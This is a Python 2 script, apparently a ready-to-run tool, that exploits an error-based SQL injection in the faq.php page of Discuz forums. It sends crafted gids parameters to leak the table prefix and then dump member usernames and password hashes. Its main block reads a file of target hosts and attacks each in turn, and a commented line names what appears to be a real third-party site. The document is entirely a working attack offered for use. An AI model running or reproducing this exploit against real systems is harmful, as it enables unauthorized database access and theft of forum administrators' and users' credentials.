#coding=utf-8
import requests
import re
import urllib2
import urllib
class DiscuzAttacker():
	'''发送请求'''
	def send_request(self,url,para):
		try:
			if url.startswith("http://"):
				pass
			else:
				url = 'http://%s' % url
			data = urllib.quote(para,"?@`[]*,+()/'&=!_%")
			url_final = "%s?%s" % (url,data)
			res = urllib2.urlopen(url_final,timeout=5).read()
		except Exception, e:
			print 'Exploit Failed：%s' % str(e)
			return None
		return res

	'''获取discuz数据库中表的前缀'''
	def get_table_pre(self,url):
		para = "action=grouppermission&gids[99]='&gids[100][0]=) and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x  )a)%23"
		page_content = self.send_request(url,para)
		if not page_content:
			return None
		pattern = re.compile(r"Duplicate entry '[0,1]?(.*?)[0,1]?'")
		infos = pattern.findall(page_content)
		if not infos:
			return None
		if infos[0].count('[Table]') != 0:
			#默认的表前缀
			return 'cdb'
		elif infos[0].count('_') != 0:
			#非默认表前缀
			return infos[0][0:infos.index("_")]
		else:
			return None

	'''获取管理员信息'''
	def faq_sqlin_exploit(self,url,count=0):
		url = url + '/faq.php'
		table_pre = self.get_table_pre(url)
		if not table_pre:
			return None
		para = "action=grouppermission&gids[99]='&gids[100][0]=) and (select 1 from (select count(*),concat((select concat(username,0x20,password) from {table_pre}_members limit {start},1),floor(rand(0)*2))x from information_schema.tables group by x  )a)%23".format(table_pre=table_pre,start=count)
		page_content = self.send_request(url,para)
		if not page_content:
			return None
		pattern = re.compile(r"Duplicate entry '[0,1]?(.*?)[0,1]?'")
		infos = pattern.findall(page_content)
		if infos == []:
			print 'Exploit Failed'
			return None
		else:
			return infos[0].split(' ')


if __name__ == '__main__':
	#url = 'http://localhost/discuz/upload/faq.php'
	#url = "www.fj36.com/faq.php"
	f = open('data1.txt','rb')
	dz_list = []
	for x in f:
		dz_list.append(x.replace('\r\n',''))
	f.close()

	for x in dz_list:
		url = "http://%s/%s" % (x,"faq.php")
		print url
		attacker = DiscuzAttacker()
		res_list = attacker.faq_sqlin_exploit(url)
		if res_list == None:
			print 'Exploit Failed'
		else:
			username = res_list[0]
			password = res_list[1]
			print 'Exploit Success:'
			print 'username: %s password:%s' % (username,password)

